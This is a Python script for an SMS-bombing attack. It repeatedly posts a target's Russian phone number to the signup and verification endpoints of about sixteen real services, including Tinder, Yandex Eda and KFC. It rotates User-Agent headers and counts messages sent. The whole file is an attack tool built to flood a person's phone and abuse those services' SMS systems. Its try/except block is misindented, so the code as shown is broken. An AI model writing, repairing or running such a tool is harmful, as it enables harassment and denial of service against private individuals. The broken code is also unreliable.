import random
import requests
import datetime


# colours
green     = '\033[92m'
cyan      = '\033[95m'
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = '\033[91m'

# headers for optimizing sms sent
heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
           
           
def check(sent, sms):
    if sent == sms:
        quit()
 

def time(sent):
    a = datetime.datetime.now()
    time = (str(a.hour) + ':' + str(a.minute) + ':' +str(a.second))
    msg1 = f"{green}{bold}{str(sent)}{end} sms sent!"
    msg2 = f"{green}{bold}{str(time)}{end}"
    if int(sent) < 10:
    	print(f"{msg1}         {msg2}")
    elif int(sent) < 100:
    	print(f"{msg1}        {msg2}")
    elif int(sent) < 1000:
    	print(f"{msg1}       {msg2}")
    elif int(sent) < 10000:
    	print(f"{msg1}      {msg2}")
    else:
        print(f"{msg1}     {msg2}")
    	

def attack(number, sms):
    number_7 = str(7) + number
    number_plus7 = str(+7) + number
    number_8 = str(8) + number
    sent = 0
    print("-" * 33)
    print(f"|  {green}{bold}  amount   {end} | {green}{bold}     time     {end} |")
    print("-" * 33)
    HEADERS = random.choice(heads)
    while sent <= sms:
        # send request to all APIs for sending sms
        APIs = ['https://b.utair.ru/api/v1/login/', 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', 'https://www.citilink.ru/registration/confirm/phone/+', 'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', 'https://app.karusel.ru/api/v1/phone/', 'https://youdrive.today/login/web/phone', 'https://api.mtstv.ru/v1/users', 'https://youla.ru/web-api/auth/request_code', 'https://eda.yandex/api/v1/user/request_authentication_code', 'https://api.ivi.ru/mobileapi/user/register/phone/v6', 'https://api.delitime.ru/api/v2/signup', 'https://www.icq.com/smsreg/requestPhoneValidation.php', 'https://api.sunlight.net/v3/customers/authorization/', 'https://qlean.ru/clients-api/v2/sms_codes/auth/request_code', 'https://cloud.mail.ru/api/v2/notify/applink', 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms']
        for API in APIs:
            try:
                requests.post(API, data={'phone': number_7}, headers=HEADERS)
                sent += 1
                time(sent)
                check(sent,sms)
        except:
            pass
